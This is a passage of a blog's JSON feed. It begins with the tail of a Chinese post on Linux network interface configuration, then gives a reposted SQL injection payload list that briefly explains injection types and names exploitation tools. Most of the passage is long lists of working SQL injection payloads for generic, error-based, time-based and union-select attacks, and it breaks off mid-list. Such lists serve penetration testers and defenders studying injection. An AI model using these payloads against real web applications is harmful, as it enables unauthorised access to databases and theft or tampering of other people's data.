variable\">IPV6_DEFROUTE</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token assign-left variable\">IPV6_FAILURE_FATAL</span><span class=\"token operator\">=</span>no</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token assign-left variable\">IPV6_ADDR_GEN_MODE</span><span class=\"token operator\">=</span>stable-privacy</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token assign-left variable\">NAME</span><span class=\"token operator\">=</span>ens33</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token assign-left variable\">UUID</span><span class=\"token operator\">=</span>3693f084-6c9a-4b4e-82ef-62377f4c3502</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token assign-left variable\">DEVICE</span><span class=\"token operator\">=</span>ens33</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token assign-left variable\">ONBOOT</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token assign-left variable\">IPADDR</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.10.100</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token assign-left variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token assign-left variable\">GATEWAY</span><span class=\"token operator\">=</span><span class=\"token number\">192.198</span>.10.1</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#################################</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>下面介绍改配置文件中的每一行的含义。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#################################</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token assign-left variable\">DEVICE</span><span class=\"token operator\">=</span>:网卡设备名</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token assign-left variable\">HWADDR</span><span class=\"token operator\">=</span>:网卡的物理地址</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token assign-left variable\">TYPE</span><span class=\"token operator\">=</span>:网卡的类型</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token assign-left variable\">UUID</span><span class=\"token operator\">=</span>:网卡的UUID</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token assign-left variable\">IPADDR</span><span class=\"token operator\">=</span>:IP地址</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token assign-left variable\">NETMASK</span><span class=\"token operator\">=</span>:子网掩码</pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token assign-left variable\">GATEWAY</span><span class=\"token operator\">=</span>:网关</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token assign-left variable\">DNS1</span><span class=\"token operator\">=</span>:DNS</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token assign-left variable\">ONBOOT</span><span class=\"token operator\">=</span>:该网卡是否激活</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token assign-left variable\">NM_CONTROLLED</span><span class=\"token operator\">=</span>:网络是否由NetworkManager进行管理</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token assign-left variable\">BOOTPROTO</span><span class=\"token operator\">=</span>：启动远程协议为静态设置</pre></td></tr></table></figure><h1 id=\"附上思维导图\"><a class=\"anchor\" href=\"#附上思维导图\">#</a> 附上思维导图</h1>\n<p>右键新标签页查看</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n",
            "tags": [
                "review"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2020/12/30/SQL-injection-payload-list/",
            "url": "https://self-ferry.github.io/2020/12/30/SQL-injection-payload-list/",
            "title": "SQL-injection-payload-list【转】",
            "date_published": "2020-12-30T09:38:30.000Z",
            "content_html": "<h1 id=\"sql-injection-payload-list\"><a class=\"anchor\" href=\"#sql-injection-payload-list\">#</a> SQL Injection Payload List</h1>\n<p>源地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">https://github.com/payloadbox/sql-injection-payload-list</span></p>\n<h2 id=\"sql-injection\"><a class=\"anchor\" href=\"#sql-injection\">#</a> SQL Injection</h2>\n<p>In this section, we'll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.</p>\n<h2 id=\"what-is-sql-injection-sqli\"><a class=\"anchor\" href=\"#what-is-sql-injection-sqli\">#</a> What is SQL injection (SQLi)?</h2>\n<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.</p>\n<p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>\n<table>\n<thead>\n<tr>\n<th>SQL Injection Type</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>In-band SQLi (Classic SQLi)</td>\n<td>In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.</td>\n</tr>\n<tr>\n<td>Error-based SQLi</td>\n<td>Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.</td>\n</tr>\n<tr>\n<td>Union-based SQLi</td>\n<td>Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.</td>\n</tr>\n<tr>\n<td>Inferential SQLi (Blind SQLi)</td>\n<td>Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.</td>\n</tr>\n<tr>\n<td>Boolean-based (content-based) Blind SQLi</td>\n<td>Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Time-based Blind SQLi</td>\n<td>Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Out-of-band SQLi</td>\n<td>Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).</td>\n</tr>\n<tr>\n<td>Voice Based Sql Injection</td>\n<td>It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"sql-injection-vulnerability-scanner-tools\"><a class=\"anchor\" href=\"#sql-injection-vulnerability-scanner-tools\">#</a> SQL Injection Vulnerability Scanner Tool's :</h2>\n<ul>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">SQLMap</span> – Automatic SQL Injection And Database Takeover Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==\">jSQL Injection</span> – Java Tool For Automatic SQL Database Injection</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05lb2hhcHNpcy9iYnFzcWw=\">BBQSQL</span> – A Blind SQL-Injection Exploitation Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZGluZ28vTm9TUUxNYXA=\">NoSQLMap</span> – Automated NoSQL Database Pwnage</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2l0cGxvaXQuY29tLzIwMTcvMDUvd2hpdGV3aWRvdy1zcWwtdnVsbmVyYWJpbGl0eS1zY2FubmVyLmh0bWw=\">Whitewidow</span> – SQL Vulnerability Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL0RTU1M=\">DSSS</span> – Damn Small SQLi Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R0YWctZGV2LXNlYy9leHBsbw==\">explo</span> – Human And Machine Readable Web Vulnerability Testing Format</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F3bnVtYXIvYmxpbmQtc3FsLWJpdHNoaWZ0aW5n\">Blind-Sql-Bitshifting</span> – Blind SQL-Injection via Bitshifting</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xldmlhdGhhbi1mcmFtZXdvcmsvbGV2aWF0aGFu\">Leviathan</span> – Wide Range Mass Audit Toolkit</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvaG5Ucm9vbnkvQmxpc3F5\">Blisqy</span> – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)</p>\n</li>\n</ul>\n<h2 id=\"generic-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-sql-injection-payloads\">#</a> Generic SQL Injection Payloads</h2>\n<pre><code>'\n''\n`\n``\n,\n&quot;\n&quot;&quot;\n/\n//\n\\\n\\\\\n;\n' or &quot;\n-- or # \n' OR '1\n' OR 1 -- -\n&quot; OR &quot;&quot; = &quot;\n&quot; OR 1 = 1 -- -\n' OR '' = '\n'='\n'LIKE'\n'=0--+\n OR 1=1\n' OR 'x'='x\n' AND id IS NULL; --\n'''''''''''''UNION SELECT '2\n%00\n/*…*/ \n+\t\taddition, concatenate (or space in url)\n||\t\t(double pipe) concatenate\n%\t\twildcard attribute indicator\n\n@variable\tlocal variable\n@@variable\tglobal variable\n\n\n# Numeric\nAND 1\nAND 0\nAND true\nAND false\n1-false\n1-true\n1*56\n-2\n\n\n1' ORDER BY 1--+\n1' ORDER BY 2--+\n1' ORDER BY 3--+\n\n1' ORDER BY 1,2--+\n1' ORDER BY 1,2,3--+\n\n1' GROUP BY 1,2,--+\n1' GROUP BY 1,2,3--+\n' GROUP BY columnnames having 1=1 --\n\n\n-1' UNION SELECT 1,2,3--+\n' UNION SELECT sum(columnname ) from tablename --\n\n\n-1 UNION SELECT 1 INTO @,@\n-1 UNION SELECT 1 INTO @,@,@\n\n1 AND (SELECT * FROM Users) = 1\t\n\n' AND MID(VERSION(),1,1) = '5';\n\n' and 1 in (select min(name) from sysobjects where xtype = 'U' and name &gt; '.') --\n\n\nFinding the table name\n\n\nTime-Based:\n,(select * from (select(sleep(10)))a)\n%2c(select%20*%20from%20(select(sleep(10)))a)\n';WAITFOR DELAY '0:0:30'--\n\nComments:\n\n#\t    Hash comment\n/*  \tC-style comment\n-- -\tSQL comment\n;%00\tNullbyte\n`\t    Backtick\n</code></pre>\n<h2 id=\"generic-error-based-payloads\"><a class=\"anchor\" href=\"#generic-error-based-payloads\">#</a> Generic Error Based Payloads</h2>\n<pre><code> OR 1=1\n OR 1=0\n OR x=x\n OR x=y\n OR 1=1#\n OR 1=0#\n OR x=x#\n OR x=y#\n OR 1=1-- \n OR 1=0-- \n OR x=x-- \n OR x=y-- \n OR 3409=3409 AND ('pytW' LIKE 'pytW\n OR 3409=3409 AND ('pytW' LIKE 'pytY\n HAVING 1=1\n HAVING 1=0\n HAVING 1=1#\n HAVING 1=0#\n HAVING 1=1-- \n HAVING 1=0-- \n AND 1=1\n AND 1=0\n AND 1=1-- \n AND 1=0-- \n AND 1=1#\n AND 1=0#\n AND 1=1 AND '%'='\n AND 1=0 AND '%'='\n AND 1083=1083 AND (1427=1427\n AND 7506=9091 AND (5913=5913\n AND 1083=1083 AND ('1427=1427\n AND 7506=9091 AND ('5913=5913\n AND 7300=7300 AND 'pKlZ'='pKlZ\n AND 7300=7300 AND 'pKlZ'='pKlY\n AND 7300=7300 AND ('pKlZ'='pKlZ\n AND 7300=7300 AND ('pKlZ'='pKlY\n AS INJECTX WHERE 1=1 AND 1=1\n AS INJECTX WHERE 1=1 AND 1=0\n AS INJECTX WHERE 1=1 AND 1=1#\n AS INJECTX WHERE 1=1 AND 1=0#\n AS INJECTX WHERE 1=1 AND 1=1--\n AS INJECTX WHERE 1=1 AND 1=0--\n WHERE 1=1 AND 1=1\n WHERE 1=1 AND 1=0\n WHERE 1=1 AND 1=1#\n WHERE 1=1 AND 1=0#\n WHERE 1=1 AND 1=1--\n WHERE 1=1 AND 1=0--\n ORDER BY 1-- \n ORDER BY 2-- \n ORDER BY 3-- \n ORDER BY 4-- \n ORDER BY 5-- \n ORDER BY 6-- \n ORDER BY 7-- \n ORDER BY 8-- \n ORDER BY 9-- \n ORDER BY 10-- \n ORDER BY 11-- \n ORDER BY 12-- \n ORDER BY 13-- \n ORDER BY 14-- \n ORDER BY 15-- \n ORDER BY 16-- \n ORDER BY 17-- \n ORDER BY 18-- \n ORDER BY 19-- \n ORDER BY 20-- \n ORDER BY 21-- \n ORDER BY 22-- \n ORDER BY 23-- \n ORDER BY 24-- \n ORDER BY 25-- \n ORDER BY 26-- \n ORDER BY 27-- \n ORDER BY 28-- \n ORDER BY 29-- \n ORDER BY 30-- \n ORDER BY 31337-- \n ORDER BY 1# \n ORDER BY 2# \n ORDER BY 3# \n ORDER BY 4# \n ORDER BY 5# \n ORDER BY 6# \n ORDER BY 7# \n ORDER BY 8# \n ORDER BY 9# \n ORDER BY 10# \n ORDER BY 11# \n ORDER BY 12# \n ORDER BY 13# \n ORDER BY 14# \n ORDER BY 15# \n ORDER BY 16# \n ORDER BY 17# \n ORDER BY 18# \n ORDER BY 19# \n ORDER BY 20# \n ORDER BY 21# \n ORDER BY 22# \n ORDER BY 23# \n ORDER BY 24# \n ORDER BY 25# \n ORDER BY 26# \n ORDER BY 27# \n ORDER BY 28# \n ORDER BY 29# \n ORDER BY 30#\n ORDER BY 31337#\n ORDER BY 1 \n ORDER BY 2 \n ORDER BY 3 \n ORDER BY 4 \n ORDER BY 5 \n ORDER BY 6 \n ORDER BY 7 \n ORDER BY 8 \n ORDER BY 9 \n ORDER BY 10 \n ORDER BY 11 \n ORDER BY 12 \n ORDER BY 13 \n ORDER BY 14 \n ORDER BY 15 \n ORDER BY 16 \n ORDER BY 17 \n ORDER BY 18 \n ORDER BY 19 \n ORDER BY 20 \n ORDER BY 21 \n ORDER BY 22 \n ORDER BY 23 \n ORDER BY 24 \n ORDER BY 25 \n ORDER BY 26 \n ORDER BY 27 \n ORDER BY 28 \n ORDER BY 29 \n ORDER BY 30 \n ORDER BY 31337 \n RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\n RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\nIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\nIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\n%' AND 8310=8310 AND '%'='\n%' AND 8310=8311 AND '%'='\n and (select substring(@@version,1,1))='X'\n and (select substring(@@version,1,1))='M'\n and (select substring(@@version,2,1))='i'\n and (select substring(@@version,2,1))='y'\n and (select substring(@@version,3,1))='c'\n and (select substring(@@version,3,1))='S'\n and (select substring(@@version,3,1))='X'\n</code></pre>\n<h2 id=\"generic-time-based-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-time-based-sql-injection-payloads\">#</a> Generic Time Based SQL Injection Payloads</h2>\n<pre><code># from wapiti\nsleep(5)#\n1 or sleep(5)#\n&quot; or sleep(5)#\n' or sleep(5)#\n&quot; or sleep(5)=&quot;\n' or sleep(5)='\n1) or sleep(5)#\n&quot;) or sleep(5)=&quot;\n') or sleep(5)='\n1)) or sleep(5)#\n&quot;)) or sleep(5)=&quot;\n')) or sleep(5)='\n;waitfor delay '0:0:5'--\n);waitfor delay '0:0:5'--\n';waitfor delay '0:0:5'--\n&quot;;waitfor delay '0:0:5'--\n');waitfor delay '0:0:5'--\n&quot;);waitfor delay '0:0:5'--\n));waitfor delay '0:0:5'--\n'));waitfor delay '0:0:5'--\n&quot;));waitfor delay '0:0:5'--\nbenchmark(10000000,MD5(1))#\n1 or benchmark(10000000,MD5(1))#\n&quot; or benchmark(10000000,MD5(1))#\n' or benchmark(10000000,MD5(1))#\n1) or benchmark(10000000,MD5(1))#\n&quot;) or benchmark(10000000,MD5(1))#\n') or benchmark(10000000,MD5(1))#\n1)) or benchmark(10000000,MD5(1))#\n&quot;)) or benchmark(10000000,MD5(1))#\n')) or benchmark(10000000,MD5(1))#\npg_sleep(5)--\n1 or pg_sleep(5)--\n&quot; or pg_sleep(5)--\n' or pg_sleep(5)--\n1) or pg_sleep(5)--\n&quot;) or pg_sleep(5)--\n') or pg_sleep(5)--\n1)) or pg_sleep(5)--\n&quot;)) or pg_sleep(5)--\n')) or pg_sleep(5)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe\nAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\nSLEEP(5)#\nSLEEP(5)--\nSLEEP(5)=&quot;\nSLEEP(5)='\nor SLEEP(5)\nor SLEEP(5)#\nor SLEEP(5)--\nor SLEEP(5)=&quot;\nor SLEEP(5)='\nwaitfor delay '00:00:05'\nwaitfor delay '00:00:05'--\nwaitfor delay '00:00:05'#\nbenchmark(50000000,MD5(1))\nbenchmark(50000000,MD5(1))--\nbenchmark(50000000,MD5(1))#\nor benchmark(50000000,MD5(1))\nor benchmark(50000000,MD5(1))--\nor benchmark(50000000,MD5(1))#\npg_SLEEP(5)\npg_SLEEP(5)--\npg_SLEEP(5)#\nor pg_SLEEP(5)\nor pg_SLEEP(5)--\nor pg_SLEEP(5)#\n'\\&quot;\nAnD SLEEP(5)\nAnD SLEEP(5)--\nAnD SLEEP(5)#\n&amp;&amp;SLEEP(5)\n&amp;&amp;SLEEP(5)--\n&amp;&amp;SLEEP(5)#\n' AnD SLEEP(5) ANd '1\n'&amp;&amp;SLEEP(5)&amp;&amp;'1\nORDER BY SLEEP(5)\nORDER BY SLEEP(5)--\nORDER BY SLEEP(5)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--\n+benchmark(3200,SHA1(1))+'\n+ SLEEP(10) + '\nRANDOMBLOB(500000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nRANDOMBLOB(1000000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nSLEEP(1)/*' or SLEEP(1) or '&quot; or SLEEP(1) or &quot;*/\n</code></pre>\n<h2 id=\"generic-union-select-payloads\"><a class=\"anchor\" href=\"#generic-union-select-payloads\">#</a> Generic Union Select Payloads</h2>\n<pre><code> ORDER BY SLEEP(5)\n ORDER BY 1,SLEEP(5)\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n ORDER BY SLEEP(5)#\n ORDER BY 1,SLEEP(5)#\n ORDER BY 1,SLEEP(5),3#\n ORDER BY 1,SLEEP(5),3,4#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n ORDER BY SLEEP(5)-- \n ORDER BY 1,SLEEP(5)-- \n ORDER BY 1,SLEEP(5),3-- \n ORDER BY 1,SLEEP(5),3,4-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \n ORDER BY 